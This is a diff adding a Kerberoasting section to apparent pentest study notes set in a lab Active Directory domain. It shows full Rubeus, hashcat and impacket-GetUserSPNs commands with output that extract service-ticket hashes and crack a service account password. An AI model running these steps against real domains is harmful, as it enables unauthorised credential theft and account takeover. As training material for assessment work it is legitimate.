@@ -211,3 +211,98 @@ Let's assume that we are conducting an assessment in which we cannot identify an
 {% embed url="https://adsecurity.org/?p=3658" %}
 
 {% embed url="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/" %}
+
+## Kerberoasting
+
+### Rubeus
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : corp.com
+[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : iis_service
+[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
+[*] ServicePrincipalName   : HTTP/web04.corp.com:80
+[*] PwdLastSet             : 9/7/2022 5:38:43 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash written to C:\Tools\hashes.kerberoast
+```
+{% endcode %}
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+kali@kali:~$ cat hashes.kerberoast
+$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
+...
+
+kali@kali:~$ hashcat --help | grep -i "Kerberos"         
+  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
+  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
+  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
+  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
+  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
+```
+{% endcode %}
+
+The output of the above command shows that 13100 is the correct mode to crack TGS-REP hashes.
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+...
+
+$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7adec407d22bf6871d
+...
+d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
+...
+```
+{% endcode %}
+
+### Impacket-GetUserSPNs
+
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete                                      
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+Password:
+ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation 
+----------------------  -----------  --------  --------------------------  ---------  ----------
+HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <never>               
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...
+```
+{% endcode %}
+
+{% hint style="info" %}
+If impacket-GetUserSPNs throws the error "KRB\_AP\_ERR\_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate3 or rdate4 to do so.
+{% endhint %}
+
+This technique is immensely powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations. However, if the SPN runs in the context of a computer account, a managed service account,5 or a group-managed service account,6 the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the krbtgt user account which acts as service account for the KDC. Therefore, our chances of performing a successful Kerberoast attack against SPNs running in the context of user accounts is much higher.
+
+Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions7 on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user,8 kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting. We'll note that in an assessment, we should delete the SPN once we've obtained the hash to avoid adding any potential vulnerabilities to the client's infrastructure.
